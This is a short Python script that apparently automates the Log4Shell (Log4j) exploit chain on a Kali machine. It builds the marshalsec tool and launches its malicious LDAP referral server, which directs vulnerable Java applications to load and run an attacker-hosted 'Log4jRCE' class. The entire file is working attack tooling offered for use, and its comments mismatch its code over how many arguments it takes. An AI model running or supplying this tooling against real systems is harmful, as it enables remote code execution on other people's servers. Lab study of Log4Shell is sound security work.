#!/usr/bin/env python3

# Run program using the following syntax: python3 log4j.py <ip_address of kali machine>.  
# IP address above should be the one you get when running command: ip a s eth0

# Install JDK and all software required.

import subprocess
import os
import sys
from ipaddress import IPv4Address


#1. Please specify ip address of this Kali machine as an argv.
try:
    # If IPv4Network(3rd paramater is not a valid ip range, then will kick you to the except block.)
    print(f"{IPv4Address(sys.argv[1])}")
    # If it is valid it will assign the ip_range from the 3rd parameter.
    ip_addr = sys.argv[1]
    port = sys.argv[2]
    print("Valid ip address entered through command-line.")
except:
    print("Run program with command-line argument for ip address. Please re-run the program. Example would be python3 log4j.py 192.168.1.132 8888")
    exit()

#2. Change directory
cwd = os.getcwd()
os.chdir("./marshalsec/")
print(os.listdir())
subprocess.run(["mvn", "clean", "package", "-DskipTests"])

#3. Run LDAP server. In terminal you need to add "" around the ip address. In subprocess.run this is not required.
try:
    subprocess.run(["java", "-cp", "target/marshalsec-0.0.3-SNAPSHOT-all.jar", "marshalsec.jndi.LDAPRefServer", f"http://{ip_addr}:{port}/#Log4jRCE"])
except:
    print("Something went wrong. Please check that you have the correct ip address")
    
# We want to thank the following people for their contribution: 
# John Hammond : https://youtu.be/7qoPDq41xhQ
# Moritz Bechler (For creating the Java Unmarshaller Security - MarshalSec) : https://github.com/mbechler/marshalsec
# xiajun325 for clear instruction on how to use the MarshalSec tool : https://github.com/xiajun325/apache-log4j-rce-poc